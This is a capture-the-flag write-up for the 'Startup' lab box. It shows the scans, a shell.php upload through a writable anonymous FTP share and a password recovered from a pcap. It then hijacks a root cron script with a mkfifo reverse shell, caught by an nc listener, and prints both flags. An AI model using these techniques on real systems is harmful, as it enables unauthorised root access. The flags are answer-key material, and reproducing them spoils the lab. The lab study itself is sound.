# Box Name
## startup
---

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# nmap
```
Nmap 7.80 scan initiated Mon Nov  9 20:42:24 2020 as: nmap -sC -sV -vv -oN nmap/init 10.10.129.111
Increasing send delay for 10.10.129.111 from 0 to 5 due to 62 out of 206 dropped probes since last increase.
Nmap scan report for 10.10.129.111
Host is up, received syn-ack (0.21s latency).
Scanned at 2020-11-09 20:42:25 CST for 38s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp [NSE: writeable]
|_-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.2.32.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:67:c9:25:f8:04:62:85:4c:00:c0:95:95:62:97:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbuZYx13dZUojTFUca3Lpv5B9guLcLva4FGcJD4rZYnB8GGGN2afNSGlsYePV9aJXLoPOMGBjS8gpEsse8iL8ECUameBYTGuo8reVLZKNIsrESGQ5WRna0ZtAMEAmtL3YBKnaNaGplS7PMQ38cQhxcvhHodpGu18VMks4xZifaU2I3Og7RwsF0hxHRbhnpa83qXsNgOwkH8mVfyViYwB0+p+2QsMpUVjO0LJsJGRKM+s1CmKESH3eGn11Yf95AJg7aA7MAN1GJDqs+6QJKjOxILvOoTSohoJ1qKUdd6RrIZw9dtGVyltKDJr9amJdVBFk10U0KgRbdgBluv0RMkspR
|   256 dd:97:11:35:74:2c:dd:e3:c1:75:26:b1:df:eb:a4:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIDoVCg49SXsEYKmfOZu8rU/zasw7DzUSFN5IYFMCshsbLGHlpF0W+u39K2K0ZAaeY4KdA2uIwu/+qI80H4z65M=
|   256 27:72:6c:e1:2a:a5:5b:d2:6a:69:ca:f9:b9:82:2c:b9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqQFzq2zb69aZIEnPcMB5r0iGMwDWCmNRjqPiAE+u6G
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

# ferox scan
```
ferox -u http://10.10.153.230 -w ~/SecLists/Discovery/Web-Content/common.txt -t 60 -x html,txt,php -C 403 -o logs/ferox_vhost.md 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.153.230
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/common.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox_vhost.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
301        9l       28w      314c http://10.10.153.230/files
200       20l      113w      808c http://10.10.153.230/index.html
301        9l       28w      318c http://10.10.153.230/files/ftp


```
---
## Initial Foothold
---
# ftp
- ## ftp appears to be writable 
```
ftp> cd ftp
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||7834|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||51330|)
150 Ok to send data.
100% |******************************************************************************************************************************|  3462       39.30 MiB/s    00:00 ETA
226 Transfer complete.
3462 bytes sent in 00:00 (12.12 KiB/s)


```

- ## found an unusual dir in / 
	- /incidents
	```bash
	www-data@startup:/$ ls /incidents/
	suspicious.pcapng

	```
	 - ### downloaded pcap file and opened in wireshark
	  
	  ![[Pasted image 20220310161659.png]]

- ## found posible password???
	  
---
## Privilege Escalation
----
# su to lennie using password found in pcap file
```bash
www-data@startup:/$ su lennie
Password: 
lennie@startup:/$ cd 
lennie@startup:~$ ls -la
total 24
drwx------ 4 lennie lennie 4096 Mar 10 22:14 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
-rw------- 1 lennie lennie  110 Mar 10 22:14 .bash_history
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
lennie@startup:~$ 

```


# Edit /etc/print.sh 
- ## add a mkfifo [[revshell]]
- ## wait for root cron job to call back 


# root shell
```bash
nc -lnvp 1235
listening on [any] 1235 ...
connect to [10.14.9.223] from (UNKNOWN) [10.10.153.230] 51354
bash: cannot set terminal process group (21501): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@startup:~# 

```



# user.txt
```
lennie@startup:~$ cat user.txt 
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

```

# root.txt
```bash
root@startup:~# cat /root/root.txt
cat /root/root.txt
THM{f963aaa6a430f210222158ae15c3d76d}

```
